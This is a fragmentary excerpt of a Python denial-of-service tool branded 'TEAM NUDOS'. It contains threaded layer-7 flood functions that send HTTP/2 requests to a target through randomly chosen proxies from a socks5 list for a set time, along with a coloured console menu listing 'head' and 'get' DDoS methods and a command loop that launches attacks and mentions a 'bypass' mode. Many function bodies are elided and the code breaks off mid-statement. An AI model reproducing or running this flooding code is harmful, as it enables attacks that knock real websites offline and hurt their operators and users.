...
def LaunchNUDOSSOCK(url, th, t):
    ...
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackLIONNUDOS, args=(target, until, req))
            thd.start()
        except:
            pass

def AttackNUDOSSOCK(target, until_datetime, req):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
    ...
    #        limits = httpx.Limits(max_keepalive_connections=None, max_connections=None) 
            with httpx.Client(http2=True,proxies=random.choice(proxies),headers=headers,trust_env=False) as client:
                try:
                   ...
                   pass
#region testzone
def attackNUDOS(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchNUDOS, args=(url, timer)).start()

def LaunchNUDOS(url, timer):
    prox = open("./socks5.txt", 'r').read().split('\n')
    proxy = random.choice(prox).strip().split(":")
    timelol = time.time() + int(timer)
    m = random.choice(method)
...
def layer7():
    ...
    stdout.write("             "+Fore.LIGHTRED_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"head      "+Fore.LIGHTRED_EX+"|"+Fore.LIGHTWHITE_EX+" DDoS    (BASIC)             "+Fore.LIGHTRED_EX+"║\n")
    stdout.write("             "+Fore.LIGHTRED_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"get       "+Fore.LIGHTRED_EX+"|"+Fore.LIGHTWHITE_EX+" DDoS    (BASIC)             "+Fore.LIGHTRED_EX+"║\n")
    stdout.write("             "+Fore.LIGHTRED_EX            +"╚══════════════════════════════════════════════════════╝\n")
    stdout.write("\n")
##############################################################################################
def layer4():
...
def title():
    ...
    stdout.write("             "+Fore.LIGHTRED_EX+"║ "+Fore.LIGHTWHITE_EX   +"    Copyright : TEAM NUDOS   "+Fore.LIGHTRED_EX  +"                       ║\n")
...
##############################################################################################
def command():
    stdout.write(Fore.LIGHTRED_EX+"╔═══"+Fore.LIGHTRED_EX+"[""Team"+Fore.LIGHTRED_EX+"@"+Fore.LIGHTRED_EX+"NUDOS"+Fore.CYAN+"]"+Fore.LIGHTRED_EX+"\n╚══\x1b[38;2;0;255;189m> "+Fore.WHITE)
    command = input()
    if command == "cls" or command == "clear":
        ...
        if get_proxies():
            ...
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchNUDOSSOCK(target, thread, t)
            timer.join()
        ...
        target, thread, t = get_info_l7()
        threading.Thread(target=attackNUDOS, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif command == "bypass":
